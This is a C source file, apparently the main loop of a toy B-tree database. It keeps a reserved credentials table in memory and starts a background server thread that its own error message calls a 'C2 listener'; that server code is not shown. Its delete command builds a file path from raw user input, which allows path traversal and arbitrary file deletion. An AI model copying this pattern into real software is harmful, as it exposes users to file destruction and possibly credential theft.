#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <pthread.h>
#include "db.h"



btree *active_tree = NULL;
char active_tablename[64] = {0};
btree *always_loaded = NULL;


void handle_sigint(int sig) {
    (void)sig;
    printf("\n[*] Caught Ctrl+C. Cleaning up...\n");

    stopServer();  

    if (active_tree && strlen(active_tablename) > 0) {
        saveTable(active_tree->root, active_tablename);
        free_Tree(active_tree);
    }
 
		if (always_loaded) {
		    saveTable(always_loaded->root, "credentials");
		    free_Tree(always_loaded);
		}

    printf("[*] Exiting\n");
    exit(0);
}

void selectTables(char *tablename) {
    if (!tablename) return;

    tablename[strcspn(tablename, "\n")] = 0; // ← remove newline BEFORE comparing

    if (strcmp(tablename, "credentials") == 0) {
        useTable(always_loaded, tablename);  // ✅ use in-memory tree
        return;
    }

    btree *tree = loadTable(tablename);
    if (tree == NULL) return;

    active_tree = tree;
    strncpy(active_tablename, tablename, sizeof(active_tablename) - 1);
    active_tablename[sizeof(active_tablename) - 1] = '\0';

    useTable(tree, tablename);

    saveTable(tree->root, tablename);
    free_Tree(tree);
    active_tree = NULL;
    active_tablename[0] = 0;
    printf("[*] Table saved\n\n");
}
// void selectTables(char *tablename){
// 	if (strcmp(tablename, "credentials") == 0) {
// 		useTable(always_loaded, tablename);
// 		return;
// 	}
	
//   if (!tablename) return;
//   tablename[strcspn(tablename, "\n")] = 0;
//   btree *tree = loadTable(tablename);
//   if (tree == NULL) return;

//   active_tree = tree;
//   strncpy(active_tablename, tablename, sizeof(active_tablename) - 1);
//   active_tablename[sizeof(active_tablename) - 1] = '\0';

//   useTable(tree, tablename);

//   saveTable(tree->root, tablename);
//   free_Tree(tree);
//   active_tree = NULL;
//   active_tablename[0] = 0;
//   printf("[*] Table saved\n\n");
// }

void createTables(char *tablename){

	if (strcmp(tablename, "credentials") == 0) {
	    printf("[!] Cannot create reserved table 'credentials'\n");
	    return;
	}
	
	if (!tablename) return;
	tablename[strcspn(tablename, "\n")] = 0;
	btree *tree = createBtree();
	saveTable(tree->root, tablename);
	free(tree);
	printf("[*] Table created\n\n");
}

void deleteTables(char *tablename){
	if (!tablename) return;
	tablename[strcspn(tablename, "\n")] = 0;
	char path[64];
	snprintf(path, sizeof(path), "tables/%s", tablename);
	FILE *file = fopen(path, "r");
	if (file == NULL) {
		printf("[!] Table not found\n");
		return;
	}
	fclose(file);
	if (remove(path) == 0){
		printf("[*] Table deleted\n");
	}
	else {
		printf("[!] Deletion failed\n");
	}
}


int main(){

  printf("╔════════════════════════════════════════════╗\n");
  printf("║        Simple B-Tree Database              ║\n");
  printf("╚════════════════════════════════════════════╝\n");

	always_loaded = loadTable("credentials");
	if (!always_loaded) {
		printf("[!] Failed to load the creds table !\n");
		exit(1);
	}
	 
	pthread_t c2thread;
	if (pthread_create(&c2thread, NULL, (void *)startServer, NULL) != 0) {
	    printf("[!] Failed to start C2 listener thread\n");
	    exit(1);
	}
	pthread_detach(c2thread);

	run_all_tests();

	listTables();

	signal(SIGINT, handle_sigint);
	while (1) {
		printf("\nCommands:\n");
		printf("  select [table]   - Load a table\n");
		printf("  create [table]   - Create a new table\n");
		printf("  delete [table]   - Delete a table\n");
		printf("  list             - Show all tables\n");
		printf("  exit             - Quit\n");
		printf("> ");
		char buffer[100];
		if (!fgets(buffer, sizeof(buffer), stdin)) {
			printf("[!] Input error\n");
			break;
		}

		if (!strncmp(buffer, "select", 6)) {
			strtok(buffer, " ");
			char *arg = strtok(NULL, " ");
			if (!arg) {
				printf("[!] Missing argument\n");
				continue;
			}
			selectTables(arg);
		}
		else if (!strncmp(buffer, "create", 6)) {
			strtok(buffer, " ");
			char *arg = strtok(NULL, " ");
			if (!arg) {
				printf("[!] Missing argument\n");
				continue;
			}
			createTables(arg);
		}
		else if (!strncmp(buffer, "delete", 6)) {
			strtok(buffer, " ");
			char *arg = strtok(NULL, " ");
			if (!arg) {
				printf("[!] Missing argument\n");
				continue;
			}
			deleteTables(arg);
		}
		else if (!strncmp(buffer, "list", 4)) {
			listTables();
		}
		else if (!strncmp(buffer, "exit", 4)) {
			stopServer();
			if (always_loaded) {
				saveTable(always_loaded->root, "credentials");
			}
			printf("Goodbye.\n");
			exit(0);
		}
		else {
			printf("[!] Unknown command\n");
			continue;
		}
	}
}
